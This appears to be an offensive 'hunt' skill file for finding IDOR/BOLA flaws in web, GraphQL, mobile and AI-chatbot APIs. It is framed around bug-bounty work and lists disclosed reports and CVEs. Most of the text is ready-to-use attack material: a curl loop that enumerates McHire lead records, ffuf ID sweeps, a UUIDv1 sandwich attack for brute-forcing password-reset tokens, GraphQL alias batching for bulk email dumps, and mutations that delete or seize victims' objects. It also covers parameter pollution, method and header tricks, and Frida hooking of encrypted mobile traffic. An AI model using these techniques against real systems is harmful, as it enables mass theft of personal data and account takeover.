---
name: hunt-idor
description: "Modern IDOR / BOLA hunting (2025-2026). Use when target exposes /api/{resource}/{id}, GraphQL with id args, /users/{uid}, /orders/{oid}, /invoices/{iid}, /messages/{tid}, /export?file=, /reports/{rid}, /api/business/{bid}/, multi-tenant SaaS with org_id/tenant_id/workspace_id, mobile-app backends, Relay global IDs (base64 Type:N), WebSocket subscriptions with object IDs, AI chatbot session APIs, agentic copilots, RAG endpoints, or ANY user-supplied object identifier flowing to a database lookup. Covers OWASP API #1 BOLA framework; UUIDv1 Sandwich Attack prediction; UUIDv4 leak harvest; Snowflake ID prediction; Relay node-interface cross-tenant (CVE-2025-31481 API Platform GraphQL); UUID collision (CVE-2025-65017 Decidim); McHire 64M PUT /api/lead/cem-xhr lead_id (Ian Carroll + Sam Curry 2025); HackerOne $12,500 GraphQL CreateOrUpdateHackerCertification + $2,500 DestroyLlmConversation Copilot; PayPal $10,500 add-secondary-users; Shopify $5,000 billingDocumentDownload + GitHub cross-repo #3560256 + SingleStore #3219944 second-order projectID; Stripe Atlas cross-tenant; CVE-2025-13526 OneClick Chat to Order WP; CVE-2024-46528 KubeSphere; CVE-2026-41277 Flowise mass-assignment cross-workspace; CVE-2025-12030 ACF REST API; CVE-2025-3013/52389/51533/65672/13808. Parameter pollution (HPP) bypass; JSON glob/type-confusion (array, object, bool, wildcard); X-Original-URL header injection; .json/.xml/.csv route-variant trick (H1 #2487889); method tampering (GET 403 → POST/PATCH/PUT 200, IBM #2456603); content-type swap; current/me/self → numeric substitution; mass-assignment composite (Flowise pattern); session-poisoning second-order; GraphQL alias batching 10k IDs/req rate-limit bypass; mobile-app zombie endpoints (Bykea #3085742); webhook callback abuse; cookie session swap (Starbucks #876300); Autorize+PwnFox+AuthMatrix+Auth Analyzer workflow; BOLABuster LLM methodology; chain IDOR→email change→2FA disable→ATO; chain IDOR→SSRF→IMDS; chain IDOR→mass-assignment→cross-tenant org takeover (Shopify Partners $15k pattern). Only invoke if real impact (cross-tenant PII, financial loss, ATO, admin privesc) is plausible — skip 200-but-empty-response 'IDORs' and self-only access."
type: hunt
sources: hackerone, intigriti, portswigger, hacktricks, owasp_api, payloadsallthethings, github_seclists, watchtowr, oasis_security, semgrep, unit42, realize_security, appsec_labs, landh_tech, checkmarx, escape_tech
---

# Hunt: IDOR / BOLA — Deep Research 2025-2026

## Why IDOR / BOLA Pays the Most in 2025-2026

- **OWASP Web Top 10 #1** (Broken Access Control A01:2021 → A01:2025).
- **OWASP API Security #1** (BOLA, unchanged 2019/2023/2025).
- **HackerOne 2025 HPSR**: access-control / IDOR variations rose **18-29% YoY**; "stronger payout" tier.
- **$81M paid by HackerOne** in past 12 months (13% YoY growth).
- IDOR is **#1 reported class** in: medical-tech 36%, professional services 31%, government 18%, retail 15%.
- **Cannot be found by scanners** — requires two accounts + contextual understanding. Human-only class.
- **Average bounty**: $1.5k-$5k single endpoint; chains to ATO/cross-tenant → $10k-$50k.

### Mega-scale 2025-2026 incidents
| Year | Target | Impact | Class |
|------|--------|--------|-------|
| 2025 | **McHire (McDonald's)** | 64M chat transcripts + session tokens via `lead_id` decrement at `PUT /api/lead/cem-xhr` | Default creds + sequential int |
| 2019 | **Pandora/Viper smart alarms** | 3M vehicles ATO + physical unlock via `account_id` (NOTE: 2019, included as IoT-class precedent) | Numeric ID + mobile API |
| 2022 | **Optus** | 9.8M Australian telco customers (2.1M docs) via unauthenticated customer-support API | Pre-auth IDOR |
| 2024-19 | **First American EaglePro** | 800M documents exposed 5 years via URL parameter | Pre-auth doc IDOR |
| 2024 | **KubeSphere CVE-2024-46528** | Cluster monitoring + user-list read by low-priv | Excessive GlobalRole |
| 2025 | **CVE-2025-13526** | OneClick Chat to Order WP: pre-auth `order_id` IDOR → mass order PII | URL param + sequential |
| 2025 | **CVE-2025-31481** | API Platform GraphQL — `node(id:)` bypasses security on `book(id:)` | Relay node bypass |
| 2025 | **CVE-2025-65017** | Decidim UUID collision → private exports cross-readable (~2.3% rate) | UUID generator flaw |
| 2025 | **CVE-2025-12030** | ACF to REST API WP — contributor modifies any object's fields | Mass-assignment IDOR |
| 2025 | **CVE-2025-3013** | NightWolf Customer Portal — IDOR access control | Param manipulation |
| 2025 | **CVE-2025-52389** | Envasadora H2O Soda Cristal — pre-auth IDOR | Crafted HTTP |
| 2025 | **CVE-2025-51533** | Sage DPW — unauth access to internal forms | Crafted GET |
| 2025 | **CVE-2025-65672** | ClassroomIO — student → restricted Course Settings | Missing auth |
| 2025 | **CVE-2025-13808** | Orionsec Orion-ops — unauth User Profile Handler bypass | No auth |
| 2026 | **CVE-2026-41277 Flowise** | Mass-assignment DocumentStore cross-workspace takeover | UPSERT via client-PK |
| 2026 | **Chamilo LMS** | Learning Path progress endpoint IDOR (CVSS 7.1) | Missing owner check |

### Top HackerOne disclosed IDOR bounties (mined 2026-05)

**Tier S — $10k+**
- **#415081 PayPal** — Add secondary users to ANY business — **$10,500** (781 ↑)
- **#2122671 HackerOne** — GraphQL `CreateOrUpdateHackerCertification` delete-by-id — **$12,500** (381 ↑)

**Tier A — $5k**
- **#2207248 Shopify** — `billingDocumentDownload(id:)` cross-merchant PDF — **$5,000** (176 ↑)
- **#1658418 Reddit** — Mod logs `?subreddit=` for any sub — **$5,000** (153 ↑)
- **#1066203 Stripe** — GraphQL cross-tenant `UpdateAtlasApplicationPerson` — Disclosed

**Tier B — $1k-$3k**
- **#1966006 Unikrn** — Cashier `?user_id=` PII enum — **$3,000**
- **#723461 Mail.ru** — Pandao order delivery — **$3,000**
- **#1392630 TikTok** — Seller ticket access — **$2,500**
- **#2218334 HackerOne** — Unreleased Copilot `DestroyLlmConversation` — **$2,500**
- **#459443 New Relic** — Insights dashboard filter — **$2,500**
- **#380410 #681473 #186279 Pornhub** — Delete/edit/private — **$1,500 ×3**
- **#1500+ New Relic** — Internal users, alerts, synthetics — **$1,500 ×2**
- **#2528293 GitLab** — ML model cross-project — **$1,160**
- **#1410498 Judge.me** — Buyer info — **$1,250**
- **#484339 Mail.ru** — Change user address — **$1,000**
- **#56511 Shopify** — Expire other-user sessions — **$1,000**

**Tier C — $500-$888**
- Open-Xchange (×6) — $250-$888
- DoD (×N) — $500
- TikTok ads & products — $500
- Razer Pay / molpay — $500
- Affirm orders — $500
- Tools for Humanity (Worldcoin) `FetchMemberships` — $500
- Reddit Coin purchase — $500

**Notable mass / chain reports**
- **#3219944 SingleStore** — `GetNotebookScheduledPaginatedJobs?projectID=` second-order
- **#3560256 GitHub** — Cross-repo bypass-reviewer modify via `owner_id` body param
- **#2487889 HackerOne** — `/bugs.json` private-report disclosure (.json variant trick)
- **#3154983 Mozilla** — Account-delete via session misbinding
- **#3085742 Bykea** — Mobile-app hardcoded zombie endpoint
- **#876300 Starbucks SG** — ATO via cross-site PHPSESSID copy
- **#915114 Automattic CrowdSignal** — IDOR → ATO via email edit
- **#1063022 Uber** — Cross-tenant business privesc
- **#984965 TikTok** — `AddRulesToPixelEvents` cross-tenant pixel
- **#391092 Yelp** — Link victim's CC to attacker order (composite IDOR)
- **#2968039 Autodesk** — GraphQL `deleteProfileImages(id:)` mutation
- **#2633771 HackerOne** — `AddTagToAssets` operation
- **#2456603 IBM** — HTTP method-bypass IDOR
- **#1687415 #685338 DoD** — Mass ATO via email-edit IDOR

---

## Crown Jewel Targets

| Asset | Why | Typical bounty |
|-------|-----|----------------|
| AI chatbot / agent session APIs | McHire 64M precedent | $5k-$50k |
| Multi-tenant SaaS (org-isolation) | Cross-tenant = critical | $10k-$50k |
| Financial / billing endpoints | PII + money | $5k-$25k |
| Mass-assignment endpoints (create-with-PK) | Object takeover class | $5k-$25k |
| Private repo / source / IP endpoints | IP theft | $10k-$30k |
| Admin / user management APIs | Privilege jump | $5k-$25k |
| Mobile-app backends | Weaker enforcement + zombie | $2k-$15k |
| Export / download / report features | Bulk PII exfil | $3k-$15k |
| Messaging / DM platforms | Privacy + token theft | $2k-$10k |
| Vehicle / IoT account APIs | Physical safety class | $10k-$50k |
| OAuth/SSO consumer endpoints | Chain to ATO | $5k-$30k |
| GraphQL mutations | Top-paying IDOR class 2024-2026 | $5k-$15k |

**Programs that pay most**: fintech, crypto, AI/agentic platforms, dev-tools (GitHub/GitLab/Shopify), B2B SaaS, healthcare, automotive/IoT.

---

## Attack Surface Signals

### URL patterns (2026 high-priority)
```
# Classic
/api/v*/users/{id}            /api/v*/orders/{id}
/api/v*/accounts/{aid}        /api/v*/businesses/{bid}
/api/v*/orgs/{org_id}/        /api/v*/workspaces/{wid}/
/api/v*/messages/{tid}        /api/v*/threads/{tid}
/api/v*/documents/{did}       /api/v*/reports/{rid}
/api/v*/exports/{eid}         /api/v*/downloads/{file_id}
/api/v*/transfers/{xid}       /api/v*/transactions/{tid}

# Modern AI / agentic (2025-2026)
/api/v*/chats/{cid}/messages       ← AI chatbot (McHire pattern)
/api/v*/conversations/{conv_id}    ← Copilot/Hai pattern
/api/v*/ai/sessions/{sid}          ← agentic session
/api/v*/agents/{aid}/tasks/{tid}   ← agentic AI tasks
/api/v*/copilot/{cid}              ← AI assistant sessions
/api/v*/rag/{namespace}/query      ← RAG endpoints
/api/v*/embeds/{eid}               ← embedded preview
/api/v*/leads/{lead_id}            ← CRM/job platforms (McHire)
/api/lead/cem-xhr                  ← McHire exact pattern (PUT method)

# Multi-tenant / billing
/api/v*/connect/accounts/{acct}    ← Stripe Connect
/api/v*/document-store             ← Flowise mass-assignment pattern
/api/v*/scheduled-jobs?projectID=  ← SingleStore second-order
/api/v*/migration/{mig_id}/files   ← GitHub migration
/repos/{owner}/{repo}/secret-scanning/push-protection/...  ← GitHub cross-repo

# Indirect / second-order
/api/export?report_id=X            /api/export?user_id=X
/api/notifications?user_id=X       /api/scheduled-jobs?projectID=X
/api/billing/download?invoice=X    /share/{ref_id}
/api/webhook-deliveries/{wid}      /api/preview?url=X

# GraphQL
/graphql      /graphql-ws     /api/graphql     /v2/graphql
/private/graphql              /internal/graphql
# Look for: node(id:), nodes(ids:[]), {user(id:), order(id:)}

# Vehicle / IoT
/api/v*/vehicles/{vid}/control     ← Pandora-class
/api/account/{account_id}/devices

# Mobile-only paths (decompile to find)
/api/_legacy/*  /api/mobile/*  /api/v0/*  /api/internal/*

# Path-segment IDs
/users/{slug}/private/...    /u/{handle}/dms/...
```

### JS bundle signals
```bash
# Mine for endpoint patterns
grep -RoE '/api/v?[0-9]*/[a-z_-]+/\$?\{?[a-z_-]+\}?' dist/

# Find ID exposure in API client code
grep -RE 'fetch\(`/api/.*\$\{.*Id\}`' dist/
grep -RE 'axios\.(get|post|put|patch|delete)\(.*\+.*Id' dist/
grep -RE 'gql`.*\$\{.*Id\}`' dist/

# Find Redux/state exposing IDs
grep -RE '(orgId|tenantId|workspaceId|accountId|leadId|conversationId)' dist/

# GraphQL operations in JS
grep -RoE 'query [A-Z][a-zA-Z]+.*\(' dist/
grep -RoE 'mutation [A-Z][a-zA-Z]+.*\(' dist/
grep -RoE 'subscription [A-Z][a-zA-Z]+.*\(' dist/

# Sourcemaps with internal IDs
find . -name '*.js.map' -exec grep -lH 'admin\|internal\|_private' {} \;
```

### Response header signals
- `Content-Type: application/json` on `/api/{noun}/{id}` returning structured data → BOLA candidate
- `X-RateLimit-*` headers absent on enumeration-friendly endpoints → easy mass enum
- `Authorization: Bearer` accepted but server only validates token format, not scope
- No `X-User-Owns: yes` / `X-Resource-Scope: account-N` style ownership echo
- `Set-Cookie` with deterministic `user_id=` cookie → cookie-swap test
- `X-Powered-By: Express` / `X-Sourcemap-Url:` exposing dev info → zombie-endpoint hunt

### Tech-stack → IDOR likelihood
| Signal | IDOR likelihood |
|--------|-----------------|
| REST API with sequential int IDs | Very high |
| GraphQL with auto-resolvers (Hasura, PostGraphile, Strapi) | Very high |
| Relay global IDs (base64 `Type:N`) | High — enumerable after decode |
| API Platform / Symfony GraphQL (CVE-2025-31481 class) | Very high — node bypass |
| UUIDv1 token (time-encoded) | High — Sandwich Attack predictable |
| UUIDv4 + ID echoed in pagination/listing | Medium — leak harvest first |
| Snowflake ID (Twitter, Discord-style) | High — predictable |
| Microservices behind API gateway | High — middleware skips inner calls |
| Mobile-app API | High — devs assume mobile client trusted |
| Multi-tenant SaaS with `tenant_id` body | Critical — cross-tenant likely |
| Webhook receiver | Medium — often skips auth |
| Internal admin / customer-success tools | High — assumed-trust env |
| AI chatbot / agentic copilot | High — McHire precedent, conversation_id IDOR class |
| Mass-assignment create endpoints (client-PK) | High — Flowise CVE-2026-41277 class |

---

## OWASP API #1 BOLA Framework + 7-Question Gate

Canonical BOLA test:
```
1. Authenticate as User A.
2. Trigger action creating Object X owned by A. Note Object X's ID.
3. Authenticate as User B (separate account, same privilege).
4. From B's session, send the same request A would have used for Object X.
5. Server returns A's data → BOLA confirmed.
```

Seven-question gate for every IDOR:
1. Does the endpoint accept a user-supplied object identifier?
2. Is the identifier enumerable (sequential, predictable, leakable, brute-forceable)?
3. Does the server enforce ownership beyond authentication?
4. Does the response actually contain the OTHER user's data (not yours, not empty)?
5. Can the action be repeated to enumerate at scale (≥10k IDs)?
6. Does the data include PII / money / private content?
7. Can this chain to ATO, financial fraud, or cross-tenant breach?

All 7 yes → Critical-tier. 1-6 → still pays but downgrade-risk.

### Confidence-Score self-triage (require ≥ 0.85 before submit)

| Criterion | Weight |
|-----------|--------|
| Other-user data visible in response | 0.25 |
| Enumeration scale > 100 | 0.10 |
| Two independent accounts in PoC | 0.10 |
| Reproduces in < 10 min from zero | 0.10 |
| PII or financial impact | 0.20 |
| State-change verified as victim | 0.10 |
| ATO chain demonstrated | 0.15 |

---

## Step-by-Step Hunting Methodology

1. **Map every object reference.** Browse as User A. Burp passive scan. Filter Logger++ / Sitemap for: `id=`, `_id=`, `uuid=`, `/{noun}/{n}`, `/{noun}/{uuid}`, base64 ID, JWT, Relay-style.

2. **Enumerate ID types.**
   - Sequential ints → ±1, ±100, then loop 0..MAX.
   - UUIDs → leak-harvest first; UUIDv1 → Sandwich Attack.
   - Base64-encoded → decode and inspect.
   - Hashed → check predictability (`md5(email)`, `sha1(user_id)`, hashids).
   - Snowflake → estimate timestamp + sequence.

3. **Create two accounts (same privilege).**
   - Account A (resource owner / "victim").
   - Account B (attacker).
   - For SaaS: Org A and Org B (mandatory for cross-tenant).
   - For role-bound: low-priv + admin.

4. **Replay A's IDs as B.** Replace cookie/Bearer. Send identical requests. Capture differential.

5. **Use Autorize / PwnFox / Auth Analyzer / AuthMatrix** for auto-detection while browsing.

6. **Test ALL HTTP methods.** GET often gated. POST/PUT/PATCH/DELETE/HEAD/OPTIONS often aren't.

7. **Test ALL ID locations.** URL path, query, JSON body, headers, cookies, GraphQL vars, WS frames, multipart fields.

8. **Test write/destructive ops, not just reads.** DELETE, MODIFY, ADD-self.

9. **Test cross-tenant** (highest paying). Org B → Org A IDs.

10. **Test indirect/second-order.** Scheduled jobs, exports, async, notifications, webhooks.

11. **Chain IDORs.** Use one's leaked IDs to fuel the next. Email-change → ATO.

12. **Document the differential.** A's data fetched from B. Burp/curl evidence. Zero legitimate access proven.

---

## ID Type Catalog & Discovery

### Sequential integers (most exploitable)
```bash
# McHire decrement (PUT method)
for i in $(seq 64185700 -1 1); do
  curl -s -X PUT -H "Cookie: $SESS" "https://t/api/lead/cem-xhr" \
       -d "{\"lead_id\":$i}" | grep -q '"name"' && echo "HIT $i"
done

# Burp Intruder Null Payloads (1..N), filter 200
# ffuf range
ffuf -u "https://t/api/orders/FUZZ" -w <(seq 1 100000) -H "Cookie: B_SESS" -mc 200
```

### UUIDv4 — harvest leak sources
UUIDs leak in:
- Pagination listings (`/api/items?cursor=...`)
- Webhook payloads delivered to attacker
- Notification emails (HTML body)
- Exports (CSV/PDF/Excel) downloaded by attacker
- Error messages / stack traces (`Object {uuid} not found`)
- WebSocket messages
- GraphQL list/cursor queries
- Public profile pages / `og:image` URLs
- JS bundles, sourcemaps, JSON-LD
- Public S3 buckets / CDN object names
- ActivityPub / Webmention discovery
- Wayback Machine snapshots
- Search engine cached pages
- Unsubscribe / share / preview links
- In-app messages from victim to attacker (cross-thread leak)

```bash
# Mass UUID harvest from any one dashboard
curl -s -H "Cookie: A" https://t/api/dashboard \
  | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
  | sort -u
```

### UUIDv1 Sandwich Attack (Realize Security / AppSec Labs / landh.tech)

UUIDv1 = 60-bit timestamp + 14-bit clock_seq + 48-bit MAC.

Sandwich pattern (top "bread" → "filling" → bottom "bread"):
```
T1:    POST /password/reset {"email":"attacker@a.com"}  → UUID-A captured
T1+Δ:  POST /password/reset {"email":"VICTIM@v.com"}    → victim UUID generated (not visible)
T1+2Δ: POST /password/reset {"email":"attacker@a.com"}  → UUID-B captured

Now: victim UUID ∈ (UUID-A, UUID-B)
MAC = UUID-A.MAC (constant per node)
clock_seq ∈ [UUID-A.clock_seq, UUID-B.clock_seq]
timestamp ∈ [UUID-A.timestamp, UUID-B.timestamp]

Brute-force the bounded range (50ms-5s typical → 100k-500k candidates) against
/password/reset?token={candidate}
```

Tooling: `uuidv1_exploit` (github.com/ilanr/uuidv1_exploit) + UUIDv1 Sandwicher (NullSecurityX).

### UUIDv7 / Snowflake predictability
- UUIDv7: timestamp first → still random 74 bits, but leaks **creation time** (privacy/timing-attack class).
- Snowflake: 41-bit time + 10-bit machine + 12-bit seq → fully predictable for tweets/messages/lists.
- If used as private invite/share token → enumerate by (machine_id, time window, seq).

### Base64 / hashed / opaque IDs
```bash
# Base64
echo -n "user_12345" | base64       # dXNlcl8xMjM0NQ==
echo "dXNlcl8xMjM0NQ==" | base64 -d

# Common encoding
md5(email)            → md5("victim@target.com")
sha1(user_id)         → sha1("12345")
hashids               → reversible, known-secret-by-default; try secret=""

# Relay global ID (Shopify/GitHub/Stripe)
echo "T3JkZXI6MTIzNDU=" | base64 -d → Order:12345
python -c "import base64;print(base64.b64encode(b'Order:12346').decode())"

# JWT-encoded object reference
# Decode → modify sub/user_id claim → re-sign (or alg:none — see hunt-jwt)
```

### UUID Collision (CVE-2025-65017 class)
Some custom UUID gens reuse IDs under high load (race in generator, or bigint truncation in storage). Two different objects → same UUID → private exports cross-readable.

Hunt:
1. Trigger 50 concurrent exports.
2. Check if any IDs collide.
3. Try cross-account read on collision pairs.

---

## Hidden Locations Where IDs Hide (2026 expanded)

### HTTP headers
```
X-User-ID, X-Account-ID, X-Org-ID, X-Tenant-ID, X-Workspace-ID
X-Customer-ID, X-Impersonate, X-On-Behalf-Of, X-Subject-Token
X-Selected-Tenant, X-Actor-Id, X-Switch-User, X-Sudo-User
X-Original-URL, X-Rewrite-URL, X-Forwarded-Path, X-Forwarded-User
X-Override-URL, X-HTTP-Path-Override
Authorization: Bearer (decode JWT — look at sub/acct/cid claims)
```

### JSON body — exhaustive parameter dictionary
```
# Direct
user_id, owner_id, created_by, target_user_id, recipient_id
account_id, account.id, customer_id, customer.id
business_id, business.id, member_id, assignee_id, delegate_id

# Identity-act-as
on_behalf_of, acting_as, impersonate, masquerade, sudo_user
switch_user, principal_id, subject_id, actor.id

# Scope/tenancy
tenant_id, tenant.id, workspace_id, workspace.id
organization_id, org_id, org.id, project_id, project.id
team_id, group_id, channel_id, space_id, division.id, branch.id

# AI/agentic-era
conversation_id, session_id, agent_id, copilot_id, thread_id
namespace, partition, vector_collection, rag_index

# Composite/array
audience[], scope.org_id, members[], participants[], collaborators[]
```

### Cookies
```
user_id=12345; account=67890; tenant=ws-abc
prefs={"selected_org":"ORG_A"}   ← serialized state
PHPSESSID=...                    ← Starbucks #876300: cookie copy across sites
shoppingID=...                   ← session cookie swap pattern
```

### GraphQL (2026 update)
```graphql
# Variables
{"variables":{"userId":"X","input":{"ownerId":"X"}}}

# Inline
{ user(id:"X"){...} }
{ orders(filter:{userId:"X"}){...} }

# Relay node interface (CVE-2025-31481 bypasses checks on direct query)
{ node(id:"T3JkZXI6MTIzNDU="){...on Order{customer{email}}} }
{ nodes(ids:["a","b","c"]){...} }

# Alias batching (rate-limit bypass — 10k queries/req)
{ a1:user(id:"1"){email} a2:user(id:"2"){email} ... a10000:user(id:"10000"){email} }

# WebSocket subscription IDOR
{"type":"start","payload":{"query":"subscription{ msg(threadId:\"VICTIM\"){ content sender }}"}}

# Mutation IDOR (top-paying 2024-2026 class)
mutation { deleteCampaign(id:"VICTIM"){ok} }
mutation { destroyLlmConversation(id:"VICTIM"){ok} }   # H1 #2218334 $2,500
mutation { deleteProfileImages(id:"VICTIM"){ok} }      # H1 #2968039
mutation { addTagToAssets(assetId:"VICTIM"){...} }     # H1 #2633771
mutation { CreateOrUpdateHackerCertification(id:"VICTIM",...) }  # H1 #2122671 $12,500
mutation { billingDocumentDownload(id:"VICTIM") }      # Shopify $5,000
mutation { UpdateAtlasApplicationPerson(...) }         # Stripe cross-tenant
mutation { AddRulesToPixelEvents(...) }                # TikTok cross-tenant
```

### WebSocket frames
```
{"type":"subscribe","channel":"user:VICTIM"}
{"type":"join","room":"org-VICTIM"}
{"action":"watch","resource":"invoice:VICTIM"}
graphql-ws: subscription{ docUpdate(id:"OTHER_DOC"){content} }
```

### Multipart / form-data
```
Content-Disposition: form-data; name="user_id"\r\n\r\n12345
Content-Disposition: form-data; name="ownerId"\r\n\r\n12345
Content-Disposition: form-data; name="actId"\r\n\r\nVICTIM
Content-Disposition: form-data; name="njfbRefNo"\r\n\r\nVICTIM_REF  (real $5k pattern)
```

### URL path segments (mobile/legacy zombie)
```
/uploads/user_12345/file.pdf       ← path-segment IDOR
/storage/{tenant}/{user}/doc       ← swap {user}
/static/avatars/{user_id}.jpg      ← public-but-pivots
```

### Indirect / second-order
- List endpoint returns IDs → reuse in detail endpoint as different user.
- Webhook URL receives victim's object IDs → harvest from attacker server.
- Async export → ticket-ID → poll as different user.
- Scheduled job stores `user_id` at create → executes later without re-auth (SingleStore #3219944).
- Email notification HTML contains UUIDs → harvest.

---

## Test Pattern Catalog

### Basic IDOR swap (canonical)
```bash
curl -X POST -H "Cookie: SESS=A" -d '{"title":"private"}' https://t/api/notes
# {"id":"abc123",...}

curl -H "Cookie: SESS=B" https://t/api/notes/abc123
# 200 + private data → IDOR
```

### Blind IDOR (state change, no visible response)
```bash
curl -X DELETE -H "Cookie: SESS=B" https://t/api/notes/abc123
# 204

curl -H "Cookie: SESS=A" https://t/api/notes/abc123
# 404 → BLIND IDOR confirmed
```

Common blind-IDOR targets:
- DELETE on others' resources
- PATCH email/display silently
- Mark-as-read on others' notifications
- Cancel-subscription on others
- Unblock/block in messaging
- Remove users from teams/orgs
- **Disable 2FA on other accounts → silent ATO setup**
- Webhook deletion (Hackersatty pattern — free-account webhook destruction)

### Second-Order IDOR (SingleStore #3219944 template)
```
GET /api/v1/notebook/scheduled-jobs?projectID=VICTIM_PROJECT_ID
→ Returns victim's job config including stored credentials
```

Targets:
- Scheduled exports/reports
- Email notification subscriptions
- Background job queues
- Webhook delivery records
- Async batch processing (yesterday's report pattern)
- Saved templates / pinned dashboards

### GraphQL IDOR (top-paying 2024-2026)
```graphql
# 1. Introspect
{ __schema { types { name fields { name } } } }
{ __schema { queryType { fields { name args { name type { name } } } } } }
{ __schema { mutationType { fields { name args { name type { name } } } } } }
{ __schema { subscriptionType { fields { name args { name type { name } } } } } }

# 2. Direct id-arg substitution
query { invoice(id:"VICTIM_ID") { amount pdfUrl customer { email } } }
query { user(id:"VICTIM") { email phone billing { last4 } } }

# 3. Mutation IDOR (deletes, updates)
mutation { deleteCampaign(id:"VICTIM_CAMPAIGN") { ok } }
mutation { updateUser(id:"VICTIM", input:{email:"attacker@evil.com"}) { id } }

# 4. Relay node interface — CVE-2025-31481 bypass class
query { node(id:"Order:VICTIM_ORDER") { ... on Order { total } } }
query { node(id:"T3JkZXI6OTk5OQ==") { ... } }
# Even if `book(id:)` checks security, `node(id:)` may NOT (API Platform 2025 bug)

# 5. Nested/fragment exploitation
query { organization(id:"MINE") { members { ssn paymentMethods { cvv } } } }

# 6. Alias batching (rate-limit bypass + mass enum)
{ a1:user(id:"1"){e:email} a2:user(id:"2"){e:email} ... a10000:user(id:"10000"){e:email} }

# 7. WebSocket subscriptions (under-tested)
ws-frame: {"type":"start","payload":{"query":"subscription{ msg(threadId:\"VICTIM\"){ content sender }}"}}

# 8. Subscription auth bypass (graphql-ws pre-init)
# Connect WebSocket; subscribe BEFORE sending connection_init
```

### Mass-Assignment IDOR composite (Flowise CVE-2026-41277)
```
POST /api/users/me
{"display_name":"x","user_id":"VICTIM_ID"}
{"display_name":"x","id":"VICTIM_ID"}
{"display_name":"x","owner_id":"VICTIM_ID"}
{"display_name":"x","actor":{"id":"VICTIM_ID"}}
{"user":{"id":"VICTIM_ID","email":"attacker@evil.com"}}

# Flowise pattern — UPSERT via client-supplied primary key
POST /api/v1/document-store
{"id":"VICTIM_WORKSPACE_OBJECT_ID","name":"x","workspaceId":"ATTACKER_WS"}
→ migrates victim's object to attacker's workspace
```

### Method tampering (IBM #2456603)
```
GET /api/admin/users/123    → 403
POST /api/admin/users/123   → 200 (handler not protected)
PUT /api/admin/users/123    → 200
PATCH /api/admin/users/123  → 200
DELETE /api/admin/users/123 → 204
HEAD /api/admin/users/123   → 200 + ID disclosure via headers
OPTIONS /api/admin/users/123 → reveals allowed methods

# Method-override headers
X-HTTP-Method-Override: DELETE
X-Method-Override: PATCH
X-HTTP-Method: PUT
_method=DELETE (body or query)
```

### Route variant tricks (H1 #2487889 — the .json tip)
```
/reports/123          → 403
/reports/123.json     → 200    (privacy check only on HTML controller)
/reports/123.xml      → 200
/reports/123.csv      → 200
/reports/123.pdf      → 200
/reports/123/raw      → 200
/reports/123/preview  → 200
/reports/123/print    → 200

/api/v1/reports/123    → 403
/api/v2/reports/123    → 200    (version drift)
/api/v0/reports/123    → 200    (deprecated)
/api/internal/reports/123 → 200
/api/_legacy/reports/123  → 200
/api/mobile/reports/123   → 200
/api/private/reports/123  → 200
```

### Parameter Pollution (HPP) for IDOR bypass
```
# WAF/auth checks first occurrence; backend uses last
?user_id=mine&user_id=VICTIM

# JSON body equivalent
{"user_id":"mine","user_id":"VICTIM"}

# Array form
?user_id[]=mine&user_id[]=VICTIM

# Comma-separated
?user_id=mine,VICTIM

# Multiple param styles
?id=mine&userId=VICTIM&user_id=VICTIM
```

### JSON Glob / Type-Confusion (Intigriti technique)
```
{"id":1234}            ← baseline
{"id":"1234"}          ← string variant
{"id":[1234]}          ← array
{"id":[1234,1235]}     ← multi-array
{"id":{"value":1235}}  ← object wrap
{"id":true}            ← boolean
{"id":"*"}             ← wildcard
{"id":"%"}             ← SQL wildcard
{"id":null}            ← null bypass
{"id":""}              ← empty
{"id":"00001235"}      ← leading zero
{"id":-1}              ← negative (sometimes admin!)
{"id":1235.0}          ← decimal
{"id":"1234,1235"}     ← delimited string
{"id":["*"]}           ← array wildcard
```

### Content-Type Manipulation (Intigriti)
- Send same body as `application/xml` → triggers different parser → different middleware → bypass.
- `application/x-www-form-urlencoded` instead of JSON.
- `text/plain` with JSON body.

### "current" / "me" / "self" → numeric substitution
```
/api/users/me            → /api/users/12345        ← may work
/api/account/current     → /api/account/VICTIM
/api/profile/self        → /api/profile/VICTIM
?user=me                 → ?user=VICTIM
```
Also try: `mine`, `default`, `_me`, `0`, `1`, `-1`, ``.

### X-Original-URL / X-Rewrite-URL header injection
```
GET /api/v5/admin/99 HTTP/1.1
Host: target.com
X-Original-URL: /api/v5/admin/100
Cookie: ...

# Edge auth keyed on /99, backend serves /100
# Variants: X-Rewrite-URL, X-Override-URL, X-Forwarded-Path, X-HTTP-Path-Override
```

### Path normalization / dual-decode tricks
```
/api/user/22652/../1
/api/user/22652%2F../1
/api/user/%2e%2e/1            (URL-encoded ..)
/api/user/%252e%252e/1        (double-encoded)
/api/user/22652%00.json       (null byte)
/api/user/22652 /1            (space normalization)
/api/user/22652%09/1          (tab)
```

### Cross-tenant IDOR
```
# Sign up two orgs. Try Org B's session against Org A's resources.
GET /api/orgs/ORG_A/projects     (Org B session)
GET /api/projects/PROJECT_OWNED_BY_A
GET /api/billing/orgs/ORG_A/invoices
GET /api/scim/v2/Users/ORG_A_USER_ID

# Header-level cross-tenant
X-Org-Id: ORG_A   (with Org B Bearer)
X-Tenant: org_A   (with Org B cookie)
X-Selected-Tenant: ORG_A

# Body-level cross-tenant
{"org_id":"ORG_A","data":"..."}   (from Org B account)

# GitHub cross-repo (#3560256)
PATCH /repos/B/secret-scanning/push-protection/delegated-bypass-reviewers
{"owner_id":"REPO_A_OWNER"}
```

### CORS-aided IDOR
If sensitive endpoint reflects `Origin` with `Access-Control-Allow-Credentials: true` AND has IDOR → JS-driven mass exfil from victim's browser.

### Mobile-app IDORs (often least-tested — Bykea #3085742)
1. Pull APK / IPA.
2. Decompile (`apktool d`, `jadx-gui`).
3. Grep for endpoints: `grep -RhE 'https?://[^"\s]+|/api/[^"\s]+' src/`.
4. Mine for "zombie" endpoints — versions/internal-only URLs never tested on web.
5. Replay with two accounts.

For **encrypted mobile APIs**:
6. Frida-hook the encryption function (often in JNI / native lib).
7. Capture plaintext request → modify ID → re-encrypt via hook → replay.
8. Reference: SISA "Exploiting IDOR in an Encrypted Mobile API with Frida".

### IoT / device pairing IDORs
- Device registration accepts arbitrary `user_id`/`account_id` → bind to victim → control.
- Pandora 2019 (3M cars) and any 2025 IoT vendor — same class.

### AI / chatbot session IDORs (2025-2026 mega-class)
- `conversation_id`, `session_id`, `thread_id` in chat APIs.
- McHire `lead_id` was the canonical example.
- HackerOne Copilot `DestroyLlmConversation` (#2218334) — same pattern.
- Test agentic copilots: tool-call parameters often accept arbitrary `target_user_id`.
